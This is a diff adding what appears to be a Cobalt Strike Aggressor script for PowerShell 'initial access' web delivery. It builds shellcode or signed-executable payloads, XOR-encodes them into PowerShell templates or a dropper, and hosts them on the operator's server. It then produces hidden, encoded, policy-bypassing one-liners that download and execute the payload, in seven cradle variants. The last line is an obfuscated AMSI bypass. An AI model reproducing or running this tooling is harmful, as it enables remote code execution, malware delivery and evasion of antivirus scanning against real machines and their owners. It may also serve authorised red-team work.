@@ -1,0 +1,239 @@
+sub generate_random_url {
+	$path_list = @("img", "imgs", "data", "dev");
+	$ext_list = @("html", "gif", "png", "jpg");
+
+	$path = $path_list[int(rand() * size($path_list))];
+	$c0 = chr(int(rand() * 26) + 97);
+	$c1 = chr(int(rand() * 26) + 97);
+	$c2 = chr(int(rand() * 26) + 97);
+	$ext = $ext_list[int(rand() * size($ext_list))];
+
+	return "/" . $path . "/" . $c0 . $c1 . $c2 . "." . $ext;
+}
+
+# reduce the size of a PowerShell script.
+# $1 = the script to compress...
+sub powershell_compress {
+	local('$handle $data');
+
+	# read in our compress template
+	$handle = openf(script_resource("compress.ps1"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	# compress our script, base64 encode that, patch into compress.ps1
+	return strrep($data, '%%DATA%%', base64_encode(gzip($1)));
+}
+
+# PowerShell Download Cradle
+# $1 = URL to snag PowerShell script from. (often http://127.0.0.1:[port]/)
+sub powershell_cradle {
+	local('$url $type $hidden $encoded $command');
+	$url = $1;
+	$type = $2;
+	$hidden = $3;
+	$encoded = $4;
+
+	if ($type eq "WebClient") {
+		$command = 	"IEX (New-Object Net.Webclient).DownloadString(' $+ $url $+ ')";
+	}
+	else if ($type eq "WebRequest") {
+		$command = "[System.IO.StreamReader]::new( [System.Net.WebRequest]::Create(' $+ $url $+ ').GetResponse().GetResponseStream()).ReadToEnd() | Set-Clipboard; Get-Clipboard | IEX";
+	}
+	else if ($type eq "IWR") {
+		$command = "IEX (iwr ' $+ $url $+ ' -UseBasicParsing)";
+	}
+	else if ($type eq "XML Document") {
+		$command = "([xml]\"<?xml version=`\"1.0`\"?><a><b><c>\$((iwr ' $+ $url $+ ').content)</c></b></a>\").a.b.c | iex";
+	}
+	else if ($type eq "XMLHTTP COM Object") {
+		$command = "\$h=New-Object -ComObject Msxml2.XMLHTTP;\$h.open('GET',' $+ $url $+ ',\$false);\$h.send();iex \$h.responseText";
+	}
+	else if ($type eq "WinHttp COM Object") {
+		$command = "\$h=new-object -com WinHttp.WinHttpRequest.5.1;\$h.open('GET',' $+ $url $+ ',\$false);\$h.send();iex \$h.responseText";
+	}
+	else if ($type eq "BitsTransfer") {
+		$command = "Import-Module bitstransfer;Start-BitsTransfer ' $+ $url $+ ' \$env:temp\\template.ini;\$r=gc \$env:temp\\template.ini;rm \$env:temp\\template.ini; iex \$r";
+	}
+
+	if ($encoded eq "true" && $hidden eq "true") {
+		$command = "powershell -nop -w hidden -exec bypass -ec " . transform($command, "powershell-base64");		
+	} 
+	else if ($encoded eq "true" && $hidden eq "false") {
+		$command = "powershell -ec " . transform($command, "powershell-base64");		
+	} 
+	else if ($encoded eq "false" && $hidden eq "true") {
+		$command = "powershell -nop -w hidden -exec bypass " . $command ;
+	} 
+
+	return $command;
+}
+
+sub powershell_script {
+	local('$shellcode $arch $handle $data');
+	$shellcode = $1;
+	$arch = $2;
+
+	# format our shellcode AND patch it into the resource
+	if ($arch eq "x86" && -hasbootstraphint $shellcode) {
+		# we're going to use a different template in this circumstance.
+		$handle = openf(script_resource("template.hint.x86.ps1"));
+		$data   = readb($handle, -1);
+		closef($handle);
+
+		# calculate the locations of these hints.
+		local('$gmh_offset $gpa_offset');
+		$gmh_offset = payload_bootstrap_hint($shellcode, "GetModuleHandleA");
+		$gpa_offset = payload_bootstrap_hint($shellcode, "GetProcAddress");
+
+		return strrep($data, '%%DATA%%', base64_encode( str_xor($shellcode, chr(42)) ), '%%GPA_OFFSET%%', $gpa_offset, '%%GMH_OFFSET%%', $gmh_offset);
+	}
+	else if ($arch eq "x64" && -hasbootstraphint $shellcode) {
+		# we're going to use a different template in this circumstance.
+		$handle = openf(script_resource("template.hint.x64.ps1"));
+		$data   = readb($handle, -1);
+		closef($handle);
+
+		# calculate the locations of these hints.
+		local('$gmh_offset $gpa_offset');
+		$gmh_offset = payload_bootstrap_hint($shellcode, "GetModuleHandleA");
+		$gpa_offset = payload_bootstrap_hint($shellcode, "GetProcAddress");
+
+		return strrep($data, '%%DATA%%', base64_encode( str_xor($shellcode, chr(42)) ), '%%GPA_OFFSET%%', $gpa_offset, '%%GMH_OFFSET%%', $gmh_offset);
+	}
+	else if ($arch eq "x86") {
+		# read in the resource from the current folder
+		$handle = openf(script_resource("template.x86.ps1"));
+		$data   = readb($handle, -1);
+		closef($handle);
+		return strrep($data, '%%DATA%%', base64_encode( str_xor($shellcode, chr(42)) ));
+	}
+	else if ($arch eq "x64") {
+		# read in the resource from the current folder
+		$handle = openf(script_resource("template.x64.ps1"));
+		$data   = readb($handle, -1);
+		closef($handle);
+		return strrep($data, '%%DATA%%', base64_encode( str_xor($shellcode, chr(42)) ));
+	}
+
+	# return null if we don't know about the resource (this allows some future-proofing)   
+	return $null;
+}
+
+sub setup_pure_powershell_attack {
+    local('%options $url $script $arch $shellcode $cradle $oneliner');
+    %options = $3;
+
+    # get the arch right.
+    $arch = iff(%options["x64"] eq "true", "x64", "x86");
+
+    # generate our stageless python payload
+    $shellcode = artifact_payload(%options["listener"], "raw", $arch);
+	$script = powershell_script($shellcode, $arch);
+    $script = powershell_compress($script);
+
+    # host the script!
+    $url = site_host(%options["host"], %options["port"], %options["uri"], $script, "text/plain", "Scripted Web Delivery (powershell) ".$arch);
+
+    # tell the user our URL
+  	$cradle = powershell_cradle($url, %options["type"], %options["hidden"], %options["encoded"]);
+    prompt_text("One-liner: ", $cradle, {});
+}
+
+sub powershell_embed_exe {
+	local('$exe $handle $data');
+	$exe = $1;
+	$file = $2;
+
+	# read in the resource from the current folder
+	$handle = openf(script_resource("dropper.ps1"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	return strrep($data, '%%DATA%%', base64_encode( str_xor($exe, chr(42)) ), '%%FILE%%', $file);
+}
+
+sub setup_artifact_powershell_attack {
+    local('%options $url $script $arch $exe $cradle $oneliner');
+    %options = $3;
+
+    # get the arch right.
+    $arch = iff(%options["x64"] eq "true", "x64", "x86");
+
+    # generate our payload
+    $exe = artifact_payload(%options["listener"], "exe", $arch);
+	# sign payload
+	$exe = artifact_sign($exe);
+	# embed artifact
+	$script = powershell_embed_exe($exe, %options["file"]);
+    $script = powershell_compress($script);
+
+    # host the script!
+    $url = site_host(%options["host"], %options["port"], %options["uri"], $script, "text/plain", "Scripted Web Delivery (powershell) ".$arch);
+
+    # tell the user our URL
+  	$cradle = powershell_cradle($url, %options["type"], %options["hidden"], %options["encoded"]);
+    prompt_text("One-liner: ", $cradle, {});
+}
+
+
+# create a popup menu!
+popup attacks {
+	menu "Powershell Initial Access" {
+		item "Pure Powershell Web Delivery (Stageless)" {
+			local('$dialog %defaults');
+
+			# setup our defaults
+			%defaults["uri"]  = generate_random_url();
+			%defaults["host"] = localip();
+			%defaults["port"] = 80;
+
+			# create our dialog
+			$dialog = dialog("Pure Powershell Web Delivery (Stageless)", %defaults, &setup_pure_powershell_attack);
+			dialog_description($dialog, "Pure Powershell Web Delivery attack (Stageless)");
+			drow_text($dialog, "uri", "URI Path: ", 20);
+			drow_text($dialog, "host", "Local Host: ");
+			drow_text($dialog, "port", "Local Port: ");
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			drow_combobox($dialog, "type", "Command type:", @("IWR", "WebClient", "WebRequest", "XML Document", "XMLHTTP COM Object", "WinHttp COM Object", "BitsTransfer"));
+			drow_checkbox($dialog, "hidden", "Hidden: ", "Hide window");
+			drow_checkbox($dialog, "encoded", "Encoded: ", "Use encoded command");
+			drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "Artifact Powershell Web Delivery (Stageless)" {
+			local('$dialog %defaults');
+
+			# setup our defaults
+			%defaults["uri"]  = generate_random_url();
+			%defaults["host"] = localip();
+			%defaults["port"] = 80;
+			#%defaults["file"] = "C:\\Users\\Default\\AppData\\Local\\Temp\\template.ini";
+			%defaults["file"] = "c:\\users\\public\\template.ini";
+
+			# create our dialog
+			$dialog = dialog("Artifact Powershell Web Delivery (Stageless)", %defaults, &setup_artifact_powershell_attack);
+			dialog_description($dialog, "Artifact Powershell Web Delivery attack (Stageless)");
+			drow_text($dialog, "uri", "URI Path: ", 20);
+			drow_text($dialog, "host", "Local Host: ");
+			drow_text($dialog, "port", "Local Port: ");
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			drow_text($dialog, "file", "Filename: ");
+			drow_combobox($dialog, "type", "Command type:", @("WebClient", "WebRequest", "IWR", "XML Document", "XMLHTTP COM Object", "WinHttp COM Object", "BitsTransfer"));
+			drow_checkbox($dialog, "hidden", "Hidden: ", "Hide window");
+			drow_checkbox($dialog, "encoded", "Encoded: ", "Use encoded command");
+			drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+	}
+}
+
+
+# [Runtime.InteropServices.Marshal]::($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEkAbgB0ADMAMgA='))))([Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBDAG8AbgB0AGUAeAB0AA=='))),[Reflection.BindingFlags]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).GetValue($null),0x80004005)
